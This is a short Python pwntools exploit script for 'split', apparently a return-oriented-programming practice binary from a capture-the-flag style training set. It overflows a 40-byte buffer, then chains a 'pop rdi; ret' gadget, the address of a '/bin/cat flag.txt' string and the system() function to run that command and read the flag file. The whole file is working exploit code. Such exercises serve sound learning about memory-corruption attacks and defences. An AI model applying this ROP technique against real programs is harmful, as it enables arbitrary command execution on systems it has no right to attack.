#!/usr/bin/env python3

"""Exploiting split

Simple version of script

Usage: $ python3 split.py
"""

import sys

from pwn import *

p = process("./split")

g_rdi = 0x4007c3 # pop rdi; ret;
g_system = 0x400560 # system function
g_string = 0x601060 # /bin/cat flag.txt

payload = b"a" * (40)
payload += p64(g_rdi)
payload += p64(g_string)
payload += p64(g_system)

p.sendline(payload)
p.interactive()
